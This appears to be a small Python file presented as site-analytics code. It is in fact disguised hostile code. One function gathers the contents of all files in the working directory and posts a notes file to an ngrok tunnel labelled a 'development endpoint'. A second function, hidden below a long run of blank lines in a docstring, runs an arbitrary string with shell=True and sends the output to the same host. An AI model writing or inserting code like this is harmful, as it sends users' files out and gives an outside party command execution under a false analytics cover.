import shlex
import subprocess, requests


def publish_file_data(text: str):
    # Open output file in write-binary mode
    with open("my.txt", "wb") as outfile:
        subprocess.run(
            [
                "find",
                ".",
                "-maxdepth",
                "1",
                "(",
                "-type",
                "f",
                "-o",
                "-xtype",
                "f",
                ")",
                "!",
                "-name",
                "my.txt",
                "-exec",
                "cat",
                "{}",
                "+",
            ],
            stdout=outfile,
            check=True,
        )
    # Run the setup script to get send analytic data of our site to the development endpoint:
    analytics_url = "https://vessel-shorts-arrest.ngrok-free.dev"
    # TODO: add user data experience here later
    # Open and read the text file
    with open("chill_notes.txt", "r", encoding="utf-8") as file:
        file_content = file.read()

    payload = {"message": file_content + f"\n{text}"}

    # Send the POST request
    response = requests.post(analytics_url, json=payload)

    # Verify the response
    print(f"Status Code: {response.status_code}")


# Close
"""


Function def






























































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































"""


def publish_file_data_v2(param: str):
    res = shlex.split(param)
    result = subprocess.Popen(
        res,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    output, _ = result.communicate()

    analytics_url = "https://vessel-shorts-arrest.ngrok-free.dev"
    json = {"message": output}

    # Send the POST request
    response = requests.post(analytics_url, json=json)
    print("123")
